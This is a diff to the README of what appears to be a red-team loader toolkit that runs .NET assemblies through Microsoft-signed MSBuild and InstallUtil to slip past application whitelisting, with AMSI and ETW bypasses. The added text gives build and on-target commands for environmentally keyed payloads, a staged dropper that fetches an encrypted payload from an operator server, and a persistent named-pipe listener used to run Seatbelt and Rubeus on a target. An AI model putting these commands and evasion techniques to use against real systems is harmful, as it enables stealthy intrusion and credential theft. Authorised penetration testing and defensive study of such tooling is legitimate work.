@@ -33,11 +33,14 @@ Unmanaged Host Process
 | `loader_https.cpp` | Fetches encrypted payload over HTTPS at runtime via WinHTTP |
 | `patches.h` | AMSI/ETW bypass primitives — direct memory patch and hardware breakpoint variants |
 
+All C++ loaders support both EXE and DLL invocation via compile-time `targetType`/`targetMethod` config.
+
 ### LOLBin Payloads (bypass application whitelisting)
 
 | File | Description |
 |------|-------------|
 | `msbuild_payload.csproj` | MSBuild inline task — full chain in XML, executed by Microsoft-signed MSBuild.exe |
+| `msbuild_listener.csproj` | MSBuild named pipe listener — persistent execute-assembly loop |
 | `installutil_payload.cs` | InstallUtil payload — compile with Mono, run via Microsoft-signed InstallUtil.exe |
 | `assembly_loader.cs` | Managed C# loader with named pipe and TCP delivery channels |
 
@@ -104,8 +107,45 @@ python build_msbuild.py Seatbelt.exe -e xor -- -group=all
 # Supply your own key material
 python build_msbuild.py Seatbelt.exe --key <64-hex> --iv <32-hex> -- -group=all
 
+# Environmental keying — payload only decrypts on the target machine
+python build_msbuild.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
+
 # On target:
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_ready.csproj
+```
+
+### Staged HTTPS Delivery
+
+Generate a small dropper that fetches the encrypted payload from a URL at runtime:
+
+```bash
+# Generate dropper + payload file
+python build_msbuild.py Seatbelt.exe --staged https://your-server.com/payload.bin -- -group=all
+
+# Host the .bin file on your server, transfer the .csproj to target
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_ready.csproj
+```
+
+Works with environmental keying (`--keying`) for target-locked staged payloads.
+
+### Named Pipe Listener (interactive execute-assembly)
+
+Run multiple assemblies through a single persistent MSBuild process:
+
+```bash
+# Generate listener (outputs key/IV for the pipe client)
+python build_msbuild.py --listener pipe=shrimploader
+
+# On target — start the listener
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_ready.csproj
+
+# On operator — send assemblies through the pipe
+python pipe_client.py shrimploader Seatbelt.exe --key <hex> --iv <hex> -- -group=all
+python pipe_client.py shrimploader Rubeus.exe --key <hex> --iv <hex> -- triage
+python pipe_client.py shrimploader MyLib.dll --key <hex> --iv <hex> --type NS.Class --method Run
+
+# Shut down the listener
+python pipe_client.py shrimploader --quit
 ```
 
 ### Supported Assembly Types
@@ -123,8 +163,17 @@ DLL mode resolves public and non-public methods, static and instance. Instance m
 |--------|------|----------|-------|
 | AES-256-CBC | `-e aes` (default) | 32 bytes | RijndaelManaged on target, `cryptography` package on operator side |
 | XOR | `-e xor` | Any (default 16 bytes) | No dependencies, useful for testing weaker encryption detection |
+| Environmental keying | `--keying` | Derived 32 bytes | SHA256(salt + target properties), AES-only |
 
 All key material (key, IV, ciphertext) is zeroed after use via `Array.Clear()`.
+
+### Delivery Modes
+
+| Mode | Flag | Description |
+|------|------|-------------|
+| Inline (default) | *(none)* | Encrypted payload embedded in the .csproj as base64 |
+| Staged | `--staged <url>` | Small dropper .csproj + separate .bin payload fetched via HTTPS |
+| Listener | `--listener pipe=<name>` | Persistent named pipe listener for interactive execute-assembly |
 
 ### Embedded Payload
 
@@ -150,6 +199,17 @@ Host the encrypted payload on your server:
 python encrypt_payload.py xor YourTool.exe --format bin -o payload.bin
 # Upload payload.bin to your server
 ```
+
+### C++ DLL Support
+
+For DLL invocation in C++ loaders, set the compile-time config in the source:
+
+```cpp
+static LPCWSTR targetType   = L"Namespace.ClassName";
+static LPCWSTR targetMethod = L"Execute";
+```
+
+Leave both empty for default EntryPoint invocation (EXEs).
 
 ## AMSI/ETW Bypass
 
@@ -200,6 +260,7 @@ All C++ loaders are designed to compile with MinGW-w64 without any Windows SDK o
 - Only link-time dependencies: `-loleaut32 -lole32` (always available in MinGW)
 - `-municode` flag for `wmain` wide-string entry point
 - `-static-libgcc -static-libstdc++` for standalone binaries
+- `#include <initguid.h>` for MinGW GUID resolution
 
 ## Operational Notes
 
@@ -208,6 +269,7 @@ All C++ loaders are designed to compile with MinGW-w64 without any Windows SDK o
 - Always use `CreateDomain()` / `UnloadDomain()` rather than the default AppDomain for isolation
 - The `build_msbuild.py` script uses `--` to separate loader options from assembly arguments
 - MSBuild and InstallUtil payloads include the full AMSI + ETW bypass chain
+- The named pipe listener uses AES-256-CBC encryption for all pipe traffic
 
 ## License
 
